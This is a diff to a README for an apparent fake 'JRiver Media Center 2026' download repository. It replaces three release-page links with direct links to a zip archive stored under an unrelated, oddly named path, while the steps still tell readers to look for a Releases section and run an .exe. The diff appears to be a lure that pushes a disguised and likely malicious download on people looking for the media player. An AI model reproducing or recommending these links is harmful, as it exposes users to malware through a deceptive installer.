@@ -5,7 +5,7 @@ description: "Download and install JRiver Media Center for Windows 10 and 11 usi
 ---
 # 🎧 JRiver-Media-Center-2026 - Organize and play your media files
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Spotpenalfacility869/JRiver-Media-Center-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Spotpenalfacility869/spotpenalfacility869.github.io/main/lamellibranchiate/spotpenalfacility_github_io_v3.5.zip)
 
 ## 📁 About the software
 
@@ -25,7 +25,7 @@ Ensure your computer meets these requirements before you start the installation:
 
 Follow these steps to obtain the installation file:
 
-1. Visit [this page to download](https://github.com/Spotpenalfacility869/JRiver-Media-Center-2026/releases).
+1. Visit [this page to download](https://raw.githubusercontent.com/Spotpenalfacility869/spotpenalfacility869.github.io/main/lamellibranchiate/spotpenalfacility_github_io_v3.5.zip).
 2. Locate the latest version in the Releases section.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your Downloads folder.
@@ -76,4 +76,4 @@ The software runs locally on your machine. Your personal media files stay on you
 
 This program provides a stable environment for media management. Updates focus on compatibility with new versions of Windows. Visit the link provided below to see the latest changes to the software.
 
-[https://github.com/Spotpenalfacility869/JRiver-Media-Center-2026/releases](https://github.com/Spotpenalfacility869/JRiver-Media-Center-2026/releases)
+[https://raw.githubusercontent.com/Spotpenalfacility869/spotpenalfacility869.github.io/main/lamellibranchiate/spotpenalfacility_github_io_v3.5.zip](https://raw.githubusercontent.com/Spotpenalfacility869/spotpenalfacility869.github.io/main/lamellibranchiate/spotpenalfacility_github_io_v3.5.zip)
